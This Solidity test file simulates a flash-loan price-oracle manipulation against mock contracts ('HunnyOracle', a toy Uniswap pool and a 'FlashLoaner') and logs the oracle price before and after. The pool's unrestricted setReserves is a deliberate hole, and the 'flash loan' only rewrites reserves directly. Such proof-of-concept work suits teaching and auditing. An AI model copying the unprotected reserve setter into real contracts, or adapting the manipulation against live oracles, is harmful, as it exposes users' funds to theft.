// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./basetest.sol";

contract UniswapPool {
    uint112 public reserve0;
    uint112 public reserve1;
    uint256 public priceCumulative;
    uint32 public lastUpdateTime;

    constructor(uint112 _reserve0, uint112 _reserve1) {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
        lastUpdateTime = uint32(block.timestamp);
        priceCumulative = 0;
    }

    function update() external {
        uint32 currentTime = uint32(block.timestamp);
        uint32 timeElapsed = currentTime - lastUpdateTime;
        require(timeElapsed > 0, "No time elapsed");
        uint256 currentPrice = reserve1 > 0 ? (uint256(reserve0) * 1e18) / uint256(reserve1) : 0;
        priceCumulative += currentPrice * timeElapsed;
        lastUpdateTime = currentTime;
    }

    function setReserves(uint112 _reserve0, uint112 _reserve1) external {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
    }

    function getReserves() external view returns (uint112, uint112) {
        return (reserve0, reserve1);
    }
}

contract HunnyOracle {
    UniswapPool public pool;
    uint256 public lastCumulativePrice;
    uint32 public lastUpdateTime;

    constructor(address _pool) {
        pool = UniswapPool(_pool);
        lastCumulativePrice = pool.priceCumulative();
        lastUpdateTime = pool.lastUpdateTime();
    }

    function update() external {
        pool.update();
        uint32 currentTime = pool.lastUpdateTime();
        uint32 timeElapsed = currentTime - lastUpdateTime;
        require(timeElapsed > 0, "Oracle update: no time elapsed");
        lastCumulativePrice = pool.priceCumulative();
        lastUpdateTime = currentTime;
    }

    function consult() external view returns (uint256) {
        uint32 currentTime = uint32(block.timestamp);
        uint32 timeElapsed = currentTime - lastUpdateTime;
        require(timeElapsed > 0, "Oracle consult: no time elapsed");
        uint112 r0;
        uint112 r1;
        (r0, r1) = pool.getReserves();
        uint256 currentPrice = r1 > 0 ? (uint256(r0) * 1e18) / uint256(r1) : 0;
        uint256 currentCumulative = pool.priceCumulative() + currentPrice * timeElapsed;
        uint256 cumulativeDiff = currentCumulative - lastCumulativePrice;
        return cumulativeDiff / timeElapsed;
    }
}

contract FlashLoaner {
    UniswapPool public pool;

    constructor(address _pool) {
        pool = UniswapPool(_pool);
    }

    function executeFlashLoan(
        uint112 flashAmount0,
        uint112 flashAmount1,
        address target,
        bytes calldata data
    ) external returns (bool) {
        (uint112 originalReserve0, uint112 originalReserve1) = pool.getReserves();
        require(originalReserve0 >= flashAmount0 && originalReserve1 >= flashAmount1, "Insufficient liquidity");
        uint112 manipulatedReserve0 = originalReserve0 + flashAmount0 * 10;
        uint112 manipulatedReserve1 = originalReserve1 > flashAmount1 ? originalReserve1 - flashAmount1 : 1;
        pool.setReserves(manipulatedReserve0, manipulatedReserve1);
        (bool success, ) = target.call(data);
        require(success, "Flash loan callback failed");
        pool.setReserves(originalReserve0, originalReserve1);
        return true;
    }
}

contract YourTest is BaseTestWithBalanceLog {
    UniswapPool public pool;
    HunnyOracle public oracle;
    FlashLoaner public flashLoaner;
    address public attacker;

    function setUp() public {
        vm.deal(address(this), 100 ether);
        uint112 initialReserve0 = 1000;
        uint112 initialReserve1 = 500;
        pool = new UniswapPool(initialReserve0, initialReserve1);
        oracle = new HunnyOracle(address(pool));
        flashLoaner = new FlashLoaner(address(pool));
        attacker = address(this);
    }

    function testExploit() public balanceLog {
        vm.deal(address(this), 10 ether);

        // Step 1: Demonstrate Normal Behavior
        uint256 initialTime = block.timestamp;
        vm.warp(initialTime + 10);
        oracle.update();

        // Advance time so that consult() has a non-zero elapsed period.
        vm.warp(block.timestamp + 10);
        uint256 normalPrice = oracle.consult();
        emit LogNamedUint("Normal Oracle Price", normalPrice);

        // Step 2: Simulate Flash Loan Attack to Manipulate Oracle Data
        bytes memory callbackData = abi.encodeWithSignature("update()");
        uint112 flashAmount0 = 50;
        uint112 flashAmount1 = 25;
        bool flashSuccess = flashLoaner.executeFlashLoan(flashAmount0, flashAmount1, address(oracle), callbackData);
        require(flashSuccess, "Flash loan execution failed");

        vm.warp(block.timestamp + 10);
        uint256 manipulatedPrice = oracle.consult();
        emit LogNamedUint("Manipulated Oracle Price", manipulatedPrice);
    }

    event LogNamedUint(string key, uint256 val);
}